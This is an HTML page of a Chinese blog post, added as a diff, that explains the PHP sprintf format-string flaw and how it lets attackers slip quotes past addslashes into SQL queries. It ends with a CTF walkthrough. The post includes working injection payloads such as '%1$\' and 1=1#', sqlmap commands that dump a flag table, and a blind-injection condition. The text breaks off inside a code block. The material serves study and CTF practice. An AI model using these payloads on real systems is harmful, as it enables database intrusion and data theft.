@@ -1,0 +1,1648 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="格式化字符串漏洞,Wordpress,SQL注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="只有不断地探索新的知识，才能感受到无穷的乐趣">
+<meta name="keywords" content="格式化字符串漏洞,Wordpress,SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入解析sprintf格式化字符串漏洞">
+<meta property="og:url" content="http://1234xxh.github.io/2018/11/05/1/index.html">
+<meta property="og:site_name" content="Mr K&#39;s Blog">
+<meta property="og:description" content="只有不断地探索新的知识，才能感受到无穷的乐趣">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/1.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/2.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/3.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/4.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/5.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/6.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/7.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/8.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/9.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/10.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/sprintf漏洞/11.jpg">
+<meta property="og:updated_time" content="2018-11-05T12:27:40.946Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="深入解析sprintf格式化字符串漏洞">
+<meta name="twitter:description" content="只有不断地探索新的知识，才能感受到无穷的乐趣">
+<meta name="twitter:image" content="http://1234xxh.github.io/image/sprintf漏洞/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1234xxh.github.io/2018/11/05/1/"/>
+
+
+
+
+
+  <title>深入解析sprintf格式化字符串漏洞 | Mr K's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mr K's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Web | Python | literature</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2018/11/05/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="KKABqN">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/background.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mr K's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">深入解析sprintf格式化字符串漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-05T20:10:19+08:00">
+                2018-11-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/格式化字符串漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">格式化字符串漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/格式化字符串漏洞/Wordpress/" itemprop="url" rel="index">
+                    <span itemprop="name">Wordpress</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/格式化字符串漏洞/Wordpress/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/05/1/" class="leancloud_visitors" data-flag-title="深入解析sprintf格式化字符串漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>只有不断地探索新的知识，才能感受到无穷的乐趣<br><a id="more"></a></p>
+<h1 id="深入解析sprintf格式化字符串漏洞"><a href="#深入解析sprintf格式化字符串漏洞" class="headerlink" title="深入解析sprintf格式化字符串漏洞"></a>深入解析sprintf格式化字符串漏洞</h1><h2 id="0x01-sprintf-讲解"><a href="#0x01-sprintf-讲解" class="headerlink" title="0x01 sprintf()讲解"></a>0x01 sprintf()讲解</h2><h3 id="首先我们先了解sprintf-函数"><a href="#首先我们先了解sprintf-函数" class="headerlink" title="首先我们先了解sprintf()函数"></a>首先我们先了解sprintf()函数</h3><blockquote>
+<p>sprintf() 函数把格式化的字符串写入变量中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sprintf(format,arg1,arg2,arg++)</span><br><span class="line">arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</span><br><span class="line">注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 &quot;\$&quot; 组成。</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="通过几个例子回顾一下sprintf"><a href="#通过几个例子回顾一下sprintf" class="headerlink" title="通过几个例子回顾一下sprintf"></a>通过几个例子回顾一下sprintf</h3><blockquote>
+<p>例子1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$number = 123;</span><br><span class="line">$txt = sprintf(&quot;带有两位小数：%1\$.2f&lt;br&gt;不带小数：%1\$u&quot;,$number);</span><br><span class="line">echo $txt;</span><br><span class="line">?&gt;</span><br><span class="line">输出结果:</span><br><span class="line">带有两位小数：123.00 </span><br><span class="line">不带小数：123</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>例子2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num1 = 123456789;</span><br><span class="line">$num2 = -123456789;</span><br><span class="line">$char = 50;</span><br><span class="line">// ASCII 字符 50 是 2</span><br><span class="line">//注释：格式值 &quot;%%&quot; 返回百分号</span><br><span class="line">echo sprintf(&quot;%%b = %b&quot;,$num1).&quot;&lt;br&gt;&quot;; // 二进制数</span><br><span class="line">echo sprintf(&quot;%%c = %c&quot;,$char).&quot;&lt;br&gt;&quot;; // ASCII 字符</span><br><span class="line">echo sprintf(&quot;%%s = %s&quot;,$num1).&quot;&lt;br&gt;&quot;; // 字符串</span><br><span class="line">echo sprintf(&quot;%%x = %x&quot;,$num1).&quot;&lt;br&gt;&quot;; // 十六进制数（小写）</span><br><span class="line">echo sprintf(&quot;%%X = %X&quot;,$num1).&quot;&lt;br&gt;&quot;; // 十六进制数（大写）</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出结果:</span><br><span class="line">%b = 111010110111100110100010101</span><br><span class="line">%c = 2  //注意var_dump(&apos;2&apos;)为string</span><br><span class="line">%s = 123456789</span><br><span class="line">%x = 75bcd15</span><br><span class="line">%X = 75BCD15</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="0x02-sprintf注入原理"><a href="#0x02-sprintf注入原理" class="headerlink" title="0x02 sprintf注入原理"></a>0x02 sprintf注入原理</h2><blockquote>
+<p>我们来看一下sprintf()的底层实现方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">switch (format[inpos]) &#123;</span><br><span class="line">case &apos;s&apos;: &#123;</span><br><span class="line">zend_string *t;</span><br><span class="line">zend_string *str = zval_get_tmp_string(tmp, &amp;t);</span><br><span class="line">php_sprintf_appendstring(&amp;result, &amp;outpos,ZSTR_VAL(str),width, precision, padding,alignment,ZSTR_LEN(str),0, expprec, 0);</span><br><span class="line">zend_tmp_string_release(t);</span><br><span class="line">break;</span><br><span class="line">    &#125;</span><br><span class="line">    case &apos;d&apos;:</span><br><span class="line">        php_sprintf_appendint(&amp;result, &amp;outpos,</span><br><span class="line">                              zval_get_long(tmp),</span><br><span class="line">                              width, padding, alignment,</span><br><span class="line">                              always_sign);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &apos;u&apos;:</span><br><span class="line">        php_sprintf_appenduint(&amp;result, &amp;outpos,</span><br><span class="line">                              zval_get_long(tmp),</span><br><span class="line">                              width, padding, alignment);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &apos;g&apos;:</span><br><span class="line">    case &apos;G&apos;:</span><br><span class="line">    case &apos;e&apos;:</span><br><span class="line">    case &apos;E&apos;:</span><br><span class="line">    case &apos;f&apos;:</span><br><span class="line">    case &apos;F&apos;:</span><br><span class="line">        php_sprintf_appenddouble(&amp;result, &amp;outpos,</span><br><span class="line">                                 zval_get_double(tmp),</span><br><span class="line">                                 width, padding, alignment,</span><br><span class="line">                                 precision, adjusting,</span><br><span class="line">                                 format[inpos], always_sign</span><br><span class="line">                                );</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &apos;c&apos;:</span><br><span class="line">        php_sprintf_appendchar(&amp;result, &amp;outpos,</span><br><span class="line">                            (char) zval_get_long(tmp));</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &apos;o&apos;:</span><br><span class="line">        php_sprintf_append2n(&amp;result, &amp;outpos,</span><br><span class="line">                             zval_get_long(tmp),</span><br><span class="line">                             width, padding, alignment, 3,</span><br><span class="line">                             hexchars, expprec);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &apos;x&apos;:</span><br><span class="line">        php_sprintf_append2n(&amp;result, &amp;outpos,</span><br><span class="line">                             zval_get_long(tmp),</span><br><span class="line">                             width, padding, alignment, 4,</span><br><span class="line">                             hexchars, expprec);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &apos;X&apos;:</span><br><span class="line">        php_sprintf_append2n(&amp;result, &amp;outpos,</span><br><span class="line">                             zval_get_long(tmp),</span><br><span class="line">                             width, padding, alignment, 4,</span><br><span class="line">                             HEXCHARS, expprec);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &apos;b&apos;:</span><br><span class="line">        php_sprintf_append2n(&amp;result, &amp;outpos,</span><br><span class="line">                             zval_get_long(tmp),</span><br><span class="line">                             width, padding, alignment, 1,</span><br><span class="line">                             hexchars, expprec);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case &apos;%&apos;:</span><br><span class="line">        php_sprintf_appendchar(&amp;result, &amp;outpos, &apos;%&apos;);</span><br><span class="line"></span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：<br>没做字符类型检测的最大危害就是<strong>它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%1$\）被替换为空</strong></p>
+</blockquote>
+<blockquote>
+<p>因此sprintf注入，或者说php格式化字符串注入的原理为：<br><strong>要明白%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉</strong>，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，<strong>这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用</strong>。</p>
+</blockquote>
+<h3 id="这里我们举两个例子"><a href="#这里我们举两个例子" class="headerlink" title="这里我们举两个例子"></a>这里我们举两个例子</h3><h4 id="NO-1"><a href="#NO-1" class="headerlink" title="NO.1"></a>NO.1</h4><blockquote>
+<p>不使用占位符号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql = &quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot; ;</span><br><span class="line">$args = &quot;admin&quot; ;</span><br><span class="line">echo  sprintf ( $sql , $args ) ;</span><br><span class="line">//=&gt; echo sprintf(&quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot;, &quot;admin&quot;);</span><br><span class="line">//此时%\回去匹配admin字符串，但是%\只会匹配空</span><br><span class="line">运行后的结果</span><br><span class="line">select * from user where username = &apos;&apos; and 1=1#&apos;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h4 id="NO-2"><a href="#NO-2" class="headerlink" title="NO.2"></a>NO.2</h4><blockquote>
+<p>使用占位符号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = addslashes (&quot;%1$&apos; and 1=1#&quot; );</span><br><span class="line">$b = sprintf (&quot;AND b=&apos;%s&apos;&quot;, $input );</span><br><span class="line">$sql = sprintf (&quot;SELECT * FROM t WHERE a=&apos;%s&apos; $b &quot;, &apos;admin&apos; );</span><br><span class="line">//对$input与$b进行了拼接</span><br><span class="line">//$sql = sprintf (&quot;SELECT * FROM t WHERE a=&apos;%s&apos; AND b=&apos;%1$\&apos; and 1=1#&apos; &quot;, &apos;admin&apos; );</span><br><span class="line">//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空</span><br><span class="line">echo  $sql ;</span><br><span class="line">运行后的结果</span><br><span class="line">SELECT * FROM t WHERE a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>对于这个问题，我们还可以这样写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = sprintf (&quot;SELECT * FROM table WHERE a=&apos;%1$\&apos; AND b=&apos;%d&apos; and 1=1#&apos; &quot;,&apos;admin&apos;);</span><br><span class="line">//result: SELECT * FROM t WHERE a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>第一个格式化处匹配时为空，会让给后面的格式化匹配</p>
+</blockquote>
+<blockquote>
+<p>以上两个例子是吃掉’\’来使得单引号逃逸出来<br>下面这个例子我们构造单引号</p>
+</blockquote>
+<h4 id="NO-3"><a href="#NO-3" class="headerlink" title="NO.3"></a>NO.3</h4><blockquote>
+<p>对%c进行利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php</span><br><span class="line">$input1 = &apos;%1$c) OR 1 = 1 /*&apos; ;</span><br><span class="line">$input2 = 39 ;</span><br><span class="line">$sql = &quot;SELECT * FROM foo WHERE bar IN (&apos; $input1 &apos;) AND baz = %s&quot; ;</span><br><span class="line">$sql = sprintf ( $sql , $input2 );</span><br><span class="line">echo  $sql ;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p><strong>%c起到了类似chr()的效果，将数字39转化为‘，从而导致了sql注入。</strong><br>所以结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM foo WHERE bar IN (&apos;&apos;) OR 1 = 1 /*) AND baz = 39</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote>
+<p>漏洞利用条件</p>
+<ol>
+<li>sql语句进行了字符拼接</li>
+<li>拼接语句和原sql语句都用了vsprintf/sprintf 函数来格式化字符串<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps:</span><br><span class="line">mysql&gt; SELECT ascii(&apos;\&apos;&apos;);</span><br><span class="line">+-------------+</span><br><span class="line">| ascii(&apos;\&apos;&apos;) |</span><br><span class="line">+-------------+</span><br><span class="line">|          39 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</blockquote>
+<h2 id="0x03-题目训练"><a href="#0x03-题目训练" class="headerlink" title="0x03 题目训练"></a>0x03 题目训练</h2><h3 id="一道注入题目"><a href="#一道注入题目" class="headerlink" title="一道注入题目"></a>一道注入题目</h3><p><img src="/image/sprintf漏洞/1.jpg" alt="image"></p>
+<blockquote>
+<p>形式很像SQL注入，而且题目中提示为SQLI<br>先试了一下弱口令，确定username为admin<br>那么就对username与password进行注入，开始普通注入，二次解码，宽字节，过滤空格，过滤关键字等姿势进行构造注入语句都无果，而且还耗费大量的时间，不过后来get到一种姿势，使用burpsuit的intruder跑一下，来查看那些字母或者字符没有被过滤掉（waf字典）<br>后来发现%可疑，于是拿出来repeater一下<br><img src="/image/sprintf漏洞/2.jpg" alt="image"><br>sprintf函数出错，那么sprintf是什么，格式化字符串，于是乎就懂得其中的原理了，是其单引号逃逸<br>构造username=admin%1$\’ and 1=2# 与 username=admin%1$\’ and 1=1#<br>发现如下的结果<br><img src="/image/sprintf漏洞/3.jpg" alt="image"><br><img src="/image/sprintf漏洞/4.jpg" alt="image"><br>可以发现’后面的语句带入执行了，这就是注入点，使用sqlmap跑一下<br>事先抓取post包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 3.txt -p username --level 3 --dbs --thread 10</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="/image/sprintf漏洞/5.jpg" alt="image"></p>
+<blockquote>
+<p>于是对ctf进行跑tables<br>得到<br><img src="/image/sprintf漏洞/6.jpg" alt="image"><br>对flag跑columns<br>得到<br><img src="/image/sprintf漏洞/7.jpg" alt="image"><br>对每个列进行dump但是dump下来不对，找了一波原因没有找到，开始用脚本跑<br>跑完后才发现sqlmap跑出来的列不对，应该是flag，于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 3.txt -p username --level 3 -D ctf -T flag -C flag --dump --thread 10</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>才得到正确结果 ：）<br>下面是脚本跑的<br><img src="/image/sprintf漏洞/8.jpg" alt="image"></p>
+</blockquote>
+<h3 id="中心思想"><a href="#中心思想" class="headerlink" title="中心思想"></a>中心思想</h3><blockquote>
+<p>先判断length<br>然后使用ascii判断字母<br>ascii(substr(database(),” + str(i) +”,1))=” + str(ord(c)) + “#”<br>使用这个语句进行判断</p>
+</blockquote>
+<blockquote>
+<h3 id="涉及到的一些知识点："><a href="#涉及到的一些知识点：" class="headerlink" title="涉及到的一些知识点："></a>涉及到的一些知识点：</h3><p><img src="/image/sprintf漏洞/9.jpg" alt="image"><br><img src="/image/sprintf漏洞/10.jpg" alt="image"><br><img src="/image/sprintf漏洞/11.jpg" alt="image"></p>
+</blockquote>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 